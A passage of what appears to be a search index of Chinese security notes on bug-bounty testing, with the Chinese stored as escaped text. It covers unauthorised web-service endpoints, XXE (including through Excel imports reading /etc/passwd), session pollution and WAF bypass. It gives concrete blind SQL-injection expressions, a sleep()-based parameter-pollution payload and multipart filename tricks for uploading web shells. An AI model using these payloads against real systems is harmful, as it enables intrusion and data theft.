\u8fdc\u7a0b\u8c03\u8bd5\u65f6\u5019\u5f00\u653e\u9ed8\u8ba45001\u7aef\u53e3\u8fdb\u884c\u5bf9\u8c61\u4f20\u8f93 \u5bfb\u627e\u5bf9\u5e94\u7684\u6267\u884c\u94fe\u6784\u9020payload\u8fdb\u884crec Axis2 \u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u901a\u8fc7axis2\u6216\u8005axis\u53d1\u5e03\u7684\u670d\u52a1\uff0c\u4ece\u7edf\u8ba1\u7ecf\u9a8c\u4e0a\u6765\u8bb2\uff0c \u672a\u6388\u6743\u5927\u9762\u79ef\u5b58\u5728\uff0c\u800c\u4e14\u4f4e\u7248\u672c\u7684\u4ece\u5168\u5c40\u4e0a\u5c31\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u6f0f\u6d1e \u8bbf\u95ee\u5bf9\u5e94\u7684webservice\u8def\u5f84\uff0c\u6bd4\u5982/services/\u6216\u8005 /servlet/AxisServlet \u5bf9\u6240\u6709\u63a5\u53e3\u5bf9\u5e94\u7684\u7c7b\u8fdb\u884c\u5ba1\u8ba1\uff0c\u901a\u5e38\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e00\u4e00\u5bf9\u5e94 \u4f4e\u7248\u672c\u6784\u9020xxe payload\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u6d4b\u8bd5 Xfire Web\u53d1\u5e03\u5bb9\u5668\uff0c\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\uff0c\u622a\u81f3\u5230\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c\u5728 webservice\u4e0a\u8fd8\u662f\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u8bbf\u95ee\u6839\u8def\u5f84/services\uff0c\u66b4\u9732\u5bf9\u5e94\u7684webservices\u63a5\u53e3 \u6784\u9020payload\u5168\u5c40\u9020\u6210xml\u5b9e\u4f53\u6ce8\u5165","title":"WEBSERVICE\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#dwr","text":"\u5b9e\u9645\u7684\u7f51\u7ad9\u53d1\u5e03debug\u6a21\u5f0f\u662f\u5173\u95ed\u72b6\u6001\uff0c\u6211\u4eec\u505a\u9ed1\u76d2\u6d4b\u8bd5\u5c31\u8981\u53bb\u731c\u6d4b \u4e24\u4e2a\u9ed8\u8ba4\u76ee\u5f55,\u5206\u522b\u4e3a/exec/\u548c/dwr \u5ba1\u8ba1\u53ef\u4ee5\u5957\u7528\u5de6\u8fb9\u7684\u8bf7\u6c42\u5305\u7684\u6a21\u677f\uff0c\u5728\u4f60\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u6784\u9020 java\u63a5\u53e3\u8c03\u7528\u7684\u8bf7\u6c42\u6570\u636e\u5305 \u7f51\u7ad9\u53d1\u5e03dwr\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u662f\u672a\u6388\u6743\u8c03\u7528\uff0c\u5305\u542b\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u6bd4\u5982\u7528 \u6237\uff0c\u7ba1\u7406\u7b49api\u63a5\u53e3 \u5982\u679c\u53c2\u6570\u6784\u9020\u6709\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0c\u53ef\u4ee5\u628a\u5bf9\u5e94\u7684dwr\u63a5\u53e3\u7a7a\u5b9e\u73b0\uff0c\u7136\u540e\u8f6c \u63a5\u5230\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u672c\u5730\u6a21\u62df\u7684\u4ee3\u7801\u4e0a\u9762\u6765","title":"DWR\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#hessian","text":"","title":"HESSIAN\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#gwt","text":"","title":"GWT\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#sessionexc","text":"","title":"\u4e09\u3001\u8da3\u5473\u7684SESSION\u548cEXC"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#session","text":"\u573a\u666f\uff1a\u5728\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u65f6,\u5f88\u5e38\u89c1\u7684\u5199\u6cd5\u662f\u5148\u5c06\u9a8c\u8bc1\u7801\u5b58\u50a8\u4e8eSession\u5f53\u4e2d\uff0c\u5c06\u9a8c\u8bc1\u7801\u4f5c\u4e3a\u56fe\u7247\u6216\u662f\u624b\u673a\u9a8c\u8bc1\u7801,\u90ae\u7bb1\u7b49\u65b9\u5f0f\u53d1\u9001\u7ed9\u7528\u6237,\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u7684\u9a8c\u8bc1. \u901a\u5e38\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5f88\u5bb9\u6613\u5f15\u53d1\u4e00\u4e2a\u95ee\u9898, \u8be5\u573a\u666f\u5e38\u89c1\u4e8ephp\u4e2d:\u7528\u6237A\u627e\u56de\u5bc6\u7801,\u9700\u8981\u8fdb\u884c\u624b\u673a\u6821\u9a8c\u7801\u7684\u6821\u9a8c,\u670d\u52a1\u5668\u628a\u53d1\u9001\u51fa\u53bb\u7684\u9a8c\u8bc1\u7801\u653e\u5728\u4e86Session\u4e2d,\u6b64\u65f6\u7528\u6237\u5fc5\u987b\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\u624d\u80fd\u6210\u529f\u7684\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e \u573a\u666f: \u5728php\u4e2d,session\u4f7f\u7528\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8,\u5b83\u7684\u552f\u4e00\u6027\u4e0d\u662f\u5f88\u597d(\u591a\u4e2a\u5e94\u7528\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u4e2aSession) \u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51A\u4e0a\u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51B \uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u57df\u540d\u90fd\u89e3\u6790\u5230\u4e86\u540c\u4e00\u670d\u52a1\u5668\u4e0a,\u53ef\u80fd\u5c31\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u95ee\u9898 \u4f46\u662f\u5982\u679c\u5728\u6ca1\u53d1\u9001\u9a8c\u8bc1\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48session\u4e2dcode\u4e3a\u7a7a,\u518d\u5c06\u8bf7\u6c42\u63d0\u4ea4\u7684\u9a8c\u8bc1\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4f7f\u7528php\u7684\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4false == false\uff0c\u5373\u6761\u4ef6\u4e3a\u771f\uff0c\u9a8c\u8bc1\u7801\u5339\u914d\u6210\u529f\uff0c \u51fa\u73b0\u8fd9\u4e00\u95ee\u9898\u7684\u539f\u56e0\u662f\u7531\u4e8e\u670d\u52a1\u5668\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406session\uff0c\u5728\u4f7f\u7528\u4e4b\u540e\u5fc5\u987b\u5bf9\u5176\u8fdb\u884c\u9500\u6bc1,\u5e76\u4e14\u9700\u8981\u5bf9session\u8fdb\u884c\u7a7a\u9a8c\u8bc1 \u5728\u672a\u767b\u5f55http://admin.test.com\u7684\u60c5\u51b5\u4e0b,\u901a\u8fc7\u5148\u8bbf\u95eehttp:// www.test.com/ demo\u7ad9\u70b9\u5bf9\u81ea\u5df1\u7684session\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c,\u4f2a\u9020\u51fa\u8eab\u4efd \u90a3\u4e48\u8fd9\u4e2asession\u662f\u53ef\u4ee5\u88abhttp://admin.test.com\u8bbf\u95ee\u5230\u7684,\u6240\u4ee5\u9020\u6210\u7684\u6df7\u6dc6\u4f7f\u7528 \u5f15\u53d1\u5b89\u5168\u95ee\u9898","title":"SESSION\u6c61\u67d3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#xxeexcel","text":"\u5e94\u7528\u573a\u666f\uff1a \u5728\u5f88\u591a\u7cfb\u7edf\uff0c\u4e0d\u7ba1\u662f\u540e\u53f0\u8fd8\u662f\u524d\u53f0\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\uff0c\u5bfc\u5165/\u5bfc \u51fa\u8fd9\u6837\u7684\u5b57\u6837\uff0c\u4ece\u7edf\u8ba1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u767e\u5206\u4e4b\u516b\u5341\u4ee5\u4e0a\u90fd\u662fexcel\uff0c \u4f8b\u5982\uff0c\u5bfc\u5165\u4eba\u5458\u4fe1\u606f/\u5bfc\u51fa\u4eba\u5458\u4fe1\u606f\uff0c\u5f55\u5165\u7cfb\u7edf\u914d\u7f6e/\u5bfc\u51fa\u7cfb\u7edf\u914d \u7f6e\u7b49\u7b49 \u6280\u5de7\u53d8\u5f62\uff1a \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u6211\u4eec\u662f\u4e0d\u9700\u8981\u53bb\u4fee\u6539workbook.xml\uff0c\u6709\u65f6\u5019\u6211 \u4eec\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u5c31\u662f\uff0c\u5bfc\u51fa\u6765\u4e4b\u540e\uff0c\u7136\u540e\u6839\u636e\u683c\u5f0f\uff0c\u5916\u90e8\u5b9e\u4f53 \u5f15\u5165\uff0c\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u6bd4\u5982/etc/passwd\u7b49\uff0c\u53ef\u4ee5\u5728\u5bfc\u5165\u7684\u65f6\u5019 \u8fdb\u884c\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5e94\u8be5\u53bb\u4fee\u6539xl/worksheets/sheet1.xml \u8c03\u7528\u7684\u5b9e\u4f53 \u66ff\u6362\u6a21\u677f\u6570\u636e\u5373\u53ef\uff0c\u8fd9\u65f6\u5019\u5f53\u6211\u4eec\u5bfc\u5165\u65f6\u5019\uff0c\u5c31\u4f1a\u628a \u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u8bfb\u53d6\u51fa\u6765","title":"XXE\u5728EXCEL\u4e2d\u7684\u5e94\u7528\u573a\u666f"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/","text":"\u524d\u8a00 \u00b6 \u4e3b\u8981\u9488\u5bf9SRC\u548c\u4f17\u6d4b\uff0c\u63a2\u8ba8\u81ea\u5df1\u7684\u65b9\u6cd5 \u600e\u4e48\u5206\u6790\uff0c\u600e\u4e48\u53bb\u7ed5\uff0c\u600e\u4e48\u53bb\u83b7\u53d6\u8bc1\u636e\uff0c\u7b49\u7b49 \u4e00\u3001\u62e6\u622a\u6846\u67b6\u4e0b\u6ce8\u5165\u7684\u8fc7\u7a0b\u62c6\u89e3 \u00b6 \u8d8a\u6765\u8d8a\u591a\u7684web\u7cfb\u7edf\uff0c\u968f\u7740\u8fd0\u7ef4\u65b9\u5b89\u5168\u610f\u8bc6\u7684\u63d0\u9ad8\uff0c\u7f51\u7edc\u8bbe\u5907\u7684\u6295\u5165\uff0c \u4ee5\u53ca\u5b89\u5168\u7f16\u7801\u89c4\u8303\u7684\u4ecb\u5165\uff0c\u6f0f\u6d1e\u7684\u53d1\u73b0\u4ece\u8fc7\u53bb\u7684\u7b80\u5355\u7c97\u66b4\uff0c\u5230\u73b0\u5728\u4e3e\u6b65 \u7ef4\u8270\uff0c\u600e\u4e48\u53bb\u5224\u65ad\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u8fdb\u800c\u6839\u636e\u6f0f\u6d1e\u83b7\u53d6\u8bc1\u636e\u6570\u636e\uff0c\u8fd9\u4e2a\u662f\u4e2a \u4f17\u6d4b\u5e73\u53f0\u9009\u624b\u7684\u75db\u70b9 1.\u6570\u636e\u5e93\u5c42\u9762\u57fa\u7840\u94fa\u57ab \u00b6 \u5224\u65ad\u6027SQL\u8bed\u53e5\u7684\u5f62\u5f0f \u6761\u4ef6\u5224\u65ad\u51fd\u6570\u65b9\u6cd5\u5206\u6790 mysql if ( 1 = ( select 1 REGEXP if ( 1 = 1 , 1 , 0x00 )), 1 , 1 ) = 1 IFNULL ( ascii ( substr ( user (), 1 , 1 )) / ( 114 % ascii ( substr ( user (), 1 , 1 ))), 'yes\u2019) IFNULL(hex(substr(user(),1,1))/(114%hex(substr(user(),1,1))),' yes\u2019 ) IFNULL ( 1 / ( locate ( substr ( user (), 1 , 1 ), 'r' )), 'yes\u2019) IFNULL(1/(locate(right(left(lower(user()),1),1),' r ')),' yes\u2019 ) left ( user (), 1 ) = \"r\" ; if ( 1 = 1 , 1 , 1 ) oracle NVL ( TO_CHAR ( DBMS_XMLGEN . getxml ( 'select 1 from dual where 1337>1' )), '1' ) != 1 NVL2 ( NULLIF ( substr ( 'abc' , 1 , 1 ), 'ca' ), 1 , 2 ) = 1 INSTR ( 'abcd' , 'b' , 2 , 1 ) > 0 2018 - 10 - 21 \u2019 - decode ( 1 , 21 , 1 , to_date ( decode ( 1 , 1 , '' , 's' ), 'yyyy -mm-dd' )) - \u2019 to_date ( decode ( substr ( user , 1 , 1 ), 'a' , '' , 's' ), 'yyyy-mm-dd\u2019)) decode(sign(INSTR(USER,' A ', 2, 1)),0,to_number(' x ' ), 1 ) sqlserver PATINDEX ( 'Wa%25' , 'Washington' ) > 0 right ( left ( lower ( 'abc' ), 1 ), 1 ) = 'a\u2019 isnull(nullif(substring(' abc ',1,1),' a '),' c ')=' c ' regexp_like ( 1 ,( case when 1 = 1 then 1 else 0 x00end )) \u901a\u7528\u578b\u5224\u65adSQL\u8bed\u53e5 2.\u5c42\u5c42\u9012\u8fdb\u5206\u6790WAF\u6c42\u8bc1\u636e \u00b6 waf\u7684\u539f\u7406 \u00b6 WAF\u7684\u53d1\u5c55\u4e3b\u8981\u7ecf\u5386\u4e86IPS\u67b6\u6784\uff0c \u53cd\u5411\u4ee3\u7406 \uff0c\u900f\u660e\u4ee3\u7406\u548c\u6d41\u6a21\u5f0f\u3002 WAF\u5173\u952e\u6280\u672f \u00b6 WAF\u900f\u660e\u4ee3\u7406\u6280\u672f\u539f\u7406 waf\u901a\u4fe1 WAF\u4e3b\u8981\u4f1a\u66f4\u6539\u5982\u4e0b\u6570\u636e\u5305\u5185\u5bb9\u9879\uff1a \u5ba2\u6237\u7aefTCP\u6e90\u7aef\u53e3 \u5ba2\u6237\u7aef\u6e90MAC/\u670d\u52a1\u5668\u6e90MAC\u5730\u5740 \u957f\u77ed\u8fde\u63a5\u534f\u8bae\u7248\u672c MIME\u7c7b\u578b waf\u7684\u8bc6\u522b \u00b6 \u57fa\u4e8eCookie\u503c \u00b6 Citrix Netscaler\uff082013\u5e74\u4f7f\u7528\u5e7f\u6cdb\uff09 Citrix Netscaler\u201d\u4f1a\u5728HTTP\u8fd4\u56de\u5934\u90e8Cookie\u4f4d\u7f6e\u52a0\u5165\u201cns_af\u201d\u7684\u503c\uff0c\u53ef\u4ee5\u4ee5\u6b64\u5224\u65ad\u4e3aCitrix Netscaler\u7684WAF\uff0c\u56fd\u5185\u6b64\u7c7bWAF\u5f88\u5c11 F5 BIG IP ASM F5 BiG IP ASM\u4f1a\u5728Cookie\u4e2d\u52a0\u5165\u201cTS+\u968f\u673a\u5b57\u7b26\u4e32\u201d\u7684Cookie\u4fe1\u606f\uff0c \u57fa\u4e8eHTTP\u54cd\u5e94 \u00b6 Mod_Security Mod_Security\u662f\u4e3aApache\u8bbe\u8ba1\u7684\u5f00\u6e90Web\u9632\u62a4\u6a21\u5757\uff0c\u4e00\u4e2a\u6076\u610f\u7684\u8bf7\u6c42Mod_Security\u4f1a\u5728\u54cd\u5e94\u5934\u8fd4\u56de\u201c406 Not acceptable\u201d WebKnight WebKnight\u662f\u7528\u6765\u8bbe\u8ba1\u5728IIS\u4e0b\u9762\u4f7f\u7528\u7684WAF\u8bbe\u5907\uff0c\u8f83\u4e3a\u5e38\u89c1\u3002WebKnight\u4f1a\u5bf9\u6076\u610f\u7684\u8bf7\u6c42\u8fd4\u56de\u201c999 No Hacking\u201d F5 BIG IP F5 BIG IP\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201c419 Unknown\u201d\u7684\u4fe1\u606f dotDefender dotDefender\u7528\u6765\u9632\u62a4.net\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201cdotDefender Blocked Your Request\u201d \u7279\u5b9a\u8d44\u6e90\u6587\u4ef6 \u00b6 \u90e8\u5206\u7279\u5b9aWAF\u5728\u8fd4\u56de\u7684\u544a\u8b66\u9875\u9762\u542b\u7279\u5b9a\u7684CSS\u6216\u8005JS\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u5224\u65ad\u7684\u4f9d\u636e\uff0c\u8fd9\u7c7b\u60c5\u51b5\u5728WAF\u7c7b\u91cc\u6bd4\u8f83\u5c11\uff0c\u53ef\u5f52\u5e76\u5230HTTP\u54cd\u5e94\u4e2d\u3002 Sqlmap\u4e2dWaf\u68c0\u6d4b\u65b9\u6cd5\uff0881\u79cd\uff0c\u5305\u62ec360\uff0c\u5b89\u5168\u72d7\uff0csafe3\uff0c\u4e91\u9501\uff09 sqlmap . py - u \u201c http : // www . xxx . com \u201d -- identify - waf -- batch \u5168\u5c40\u8fc7waf\u7684\u51e0\u4e2a\u601d\u8003\u70b9 \u00b6 1. \u67b6\u6784\u5c42\u7ed5\u8fc7WAF \u00b6 1.1\u5bfb\u627e\u6e90\u7ad9 \u00b6 \u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\u6e90\u7ad9IP \u601d\u8def\u592a\u591a\uff0c\u90ae\u4ef6 \u7a77\u4e3eIP\u5730\u5740 \u5b8c\u6210\u4e00\u6b21\u56fd\u5185IP\u626b\u63cf\u53ea\u9700\u89818-9\u5c0f\u65f6 1.2\u5229\u7528\u540c\u7f51\u6bb5 \u00b6 \u4e91\u670d\u52a1\u5546\u4e70\u4e00\u53f0VPS\uff0c\u901a\u8fc7VPS\u653b\u51fb\u76ee\u6807\u7ad9\u70b9\uff0c\u56e0\u4e3a\u6d41\u91cf\u662f\u5c40\u57df\u7f51\uff0c\u53ef\u80fd\u4e0d\u7ecf\u8fc7WAF\u68c0\u6d4b\uff0c\u5b9e\u73b0\u7ed5\u8fc7 1.3\u5229\u7528\u8fb9\u754c\u6f0f\u6d1e \u00b6 \u5bfb\u627e\u5b50\u7ad9\u7684SSRF\u6f0f\u6d1e\u3002\u5982\u679c\u5b50\u7ad9\u8bbf\u95ee\u76ee\u6807\u7ad9\u4e0d\u7ecf\u8fc7WAF\u96c6\u7fa4\uff0c\u53ef\u4ee5\u5229\u7528SSRF\u6f0f\u6d1e\u6765\u7ed5\u8fc7WAF 2. \u8d44\u6e90\u9650\u5236\u89d2\u5ea6\u7ed5\u8fc7WAF \u00b6 WAF\u53ea\u68c0\u6d4b\u524d\u9762\u7684\u51e0K\u5b57\u8282\u30011M\u3001\u62162M\uff0c\u53ea\u9700\u8981\u5728POST BODY\u524d\u9762\u6dfb\u52a0\u8bb8\u591a\u65e0\u7528\u6570\u636e\uff0c\u628a\u653b\u51fbpayload\u653e\u5728\u6700\u540e\u5373\u53ef\u7ed5\u8fc7WAF\u68c0\u6d4b 3 \u534f\u8bae\u5c42\u9762\u7ed5\u8fc7WAF\u7684\u68c0\u6d4b \u00b6 3.1\u534f\u8bae\u8986\u76d6\u4e0d\u5168 \u00b6 Waf\u672a\u80fd\u8986\u76d6Content-Type: multipart/form-data\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u6216\u8005WAF\u4f1a\u8ba4\u4e3a\u5b83\u662f\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42\uff0c\u4ece\u800c\u53ea\u68c0\u6d4b\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u88ab\u7ed5\u8fc7 3.2\u534f\u8bae\u89e3\u6790\u4e0d\u6b63\u786e \u00b6 \u4f8b\u5982\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u4fee\u6539test.jpg/shell.php 3.3\u534f\u8bae\u89e3\u6790\u4e0e\u540eWEB\u5bb9\u5668\u7684\u534f\u8bae\u89e3\u6790\u4e0d\u4e00\u81f4 \u00b6 \u6587\u4ef6\u540d\u8986\u76d6 \u5728multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5757\u5b58\u5728\u591a\u4e2aContent-Disposition\uff0c\u5c06\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u7684filename\u503c\u4f5c\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7b2c\u4e00\u4e2a\u6587\u4ef6\u540dshell.123 \u7b2c\u4e8c\u4e2ashell.php \u4e0a\u4f20\u540e\u662fshell.php Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\"\" Content-Disposition: form-data;name=\"myfile\"; filename=\"t3.jsp\" \u5728\u4e00\u4e2aContent-Disposition \u4e2d\uff0c\u5b58\u5728\u591a\u4e2afilename Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\" \u9057\u6f0f\u6587\u4ef6\u540d \u5f53WAF\u9047\u5230\u201cname=\u201dmyfile\";;\u201d\u65f6\uff0c\u8ba4\u4e3a\u6ca1\u6709\u89e3\u6790\u5230filename\u3002\u800c\u540e\u7aef\u5bb9\u5668\u7ee7\u7eed\u89e3\u6790\u5230\u7684\u6587\u4ef6\u540d\u662ft3.jsp Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"\u3002 \u672a\u89e3\u6790\u6240\u6709\u6587\u4ef6 multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2aPOST\u8bf7\u6c42\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002\u5982\u56fe\uff0c\u8bb8\u591aWAF\u53ea\u68c0\u67e5\u7b2c\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ca1\u6709\u68c0\u67e5\u4e0a\u4f20\u7684\u6240\u6709\u6587\u4ef6\uff0c\u800c\u5b9e\u9645\u540e\u7aef\u5bb9\u5668\u4f1a\u89e3\u6790\u6240\u6709\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ea\u9700\u628apaylaod\u653e\u5728\u540e\u9762\u7684\u6587\u4ef6PART \u6587\u4ef6\u540d\u89e3\u6790\u517c\u5bb9\u6027 multipart\u534f\u8bae\u4e2d\uff0c\u6587\u4ef6\u540d\u7684\u5f62\u5f0f\u4e3a\u201cfilename=\"abc.php\"\u201d\u3002\u4f46\u662fTomcat\u3001PHP\u7b49\u5bb9\u5668\u89e3\u6790\u534f\u8bae\u65f6\u4f1a\u505a\u4e00\u4e9b\u517c\u5bb9\uff0c\u80fd\u6b63\u786e\u89e3\u6790 \u201dfilename=\"abc.php\u201d\u3001\u201dfilename=abc.php\u201d\u3001 \u201dfilename='abc.php\u2019\u201d\u3002\u800cWAF\u53ea\u6309\u7167\u534f\u8bae\u6807\u51c6\u53bb\u89e3\u6790\uff0c\u65e0\u6cd5\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u540e\u7aef\u5bb9\u5668\u80fd\u6b63\u786e\u83b7\u5f97\u6587\u4ef6\u540d\uff0c\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u573a\u666f\u7684\u7ed5\u8fc7\u5f62\u5f0f\uff1a Content-Disposition: form-data; name=\"file\"; filename=abc.php Content-Disposition: form-data; name=\"file\"; filename=\"abc.php Content-Disposition: form-data; name=\"file\"; filename='abc.php\u2019 3.4\u53c2\u6570\u6c61\u67d3 \u8bf7\u6c42\u4e2d\u5305\u542b2\u4e2a\u53c2\u6570\u540d\u76f8\u540c\u7684\u53c2\u6570typeid\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5e38\u53c2\u6570\u7684\u503c\u6b63\u5e38\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u624d\u662fpayload\u3002\u5982\u679cWAF\u89e3\u6790\u53c2\u6570\u4f7f\u7528\u7b2c\u4e00\u4e2a\u503c\uff0c\u6ca1\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\uff0c\u5c06\u5bfc\u81f4\u7ed5\u8fc7\u3002\u8fd9\u662f\u5f88\u4e45\u5f88\u4e45\u7684\u4e00\u4e2aCASE\uff0c\u73b0\u5728\u51e0\u4e4e\u6ca1\u6709WAF\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002 /forum.php\uff1f typeid=644&typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/ 'XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22 / 4. \u89c4\u5219\u5c42\u9762\u7684\u7ed5\u8fc7 \u00b6 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u7ed5\u8fc7WAF\u89c4\u5219\u4e3b\u8981\u601d\u8003\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\u5728\u60f3\u4ec0\u4e48\uff0c\u5bb9\u6613\u5ffd\u7565\u4ec0\u4e48\uff0c\u63a8\u65ad\u4e00\u4e9b\u53ef\u80fd\u7ed5\u8fc7\u7684\u65b9\u5f0f\uff0c\u7136\u540e\u591a\u6b21\u5c1d\u8bd5\u8fdb\u884c\u9a8c\u8bc1\u3002\u96b6\u5c5e\u4e8e\u6f0f\u6d1e\u5c42\u9762\u8fc7waf 4.1. SQL\u6ce8\u5165\u7ed5\u8fc7 \u00b6 \u7ed5\u8fc7SQL\u6ce8\u5165\u89c4\u5219\u4e3b\u8981\u5229\u7528WAF\u89c4\u5219\u672c\u8eab\u7684\u95ee\u9898\u3001\u672a\u8003\u8651\u5230SQL\u8bed\u6cd5\u53d8\u5f62\u3001\u53ca\u540e\u7aef\u6570\u636e\u5e93SQL\u8bed\u53e5\u8bed\u6cd5\u7279\u6027 \u6ce8\u91ca\u7b26\u7ed5\u8fc7 / xxx /\u662f\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5145\u5f53\u7a7a\u767d\u7b26\u3002\u56e0\u4e3a / /\u53ef\u4f7f\u5f97MySQL\u5bf9sql\u8bed\u53e5(union/ /select)\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u3002\u4e8b\u5b9e\u4e0a\u8bb8\u591aWAF\u90fd\u8003\u8651\u5230/**/\u53ef\u4ee5\u4f5c\u4e3a\u7a7a\u767d\u5206\uff0c\u4f46\u662fwaf\u68c0\u6d4b \u201c/*. */\u201d\u5f88\u6d88\u8017\u6027\u80fd\uff0c\u5de5\u7a0b\u5e08\u4f1a\u6298\u4e2d\uff0c\u53ef\u80fd\u5728\u68c0\u6d4b\u4e2d\u95f4\u5f15\u5165\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a/ \\w+*/\u3002\u6216\u8005\uff0cWAF\u53ef\u80fd\u53ea\u4e2d\u95f4\u68c0\u67e5n\u4e2a\u5b57\u7b26\u201c/*.{,n}*/\u201d\u3002\u6839\u636e\u4ee5\u4e0a\u60f3\u6cd5\uff0c\u53ef\u4ee5\u9010\u6b65\u6d4b\u8bd5\u7ed5\u8fc7\u65b9\u6cd5\uff1a \u5148\u6d4b\u8bd5\u6700\u57fa\u672c\u7684\uff1aunion/**/select \u518d\u6d4b\u8bd5\u4e2d\u95f4\u5f15\u5165\u7279\u6b8a\u5b57\uff1aunion/ aaaa%01bbs /select \u6700\u540e\u6d4b\u8bd5\u6ce8\u91ca\u957f\u5ea6\uff1aunion/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /select \u540c\u7406\uff0c\u5bf9\u4e8e/ !xxx /\uff0c\u53ef\u4ee5\u91c7\u53d6\u7c7b\u4f3c\u7684\u601d\u8def\u7ed5\u8fc7WAF\u3002 \u7a7a\u767d\u7b26\u7ed5\u8fc7 \u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c 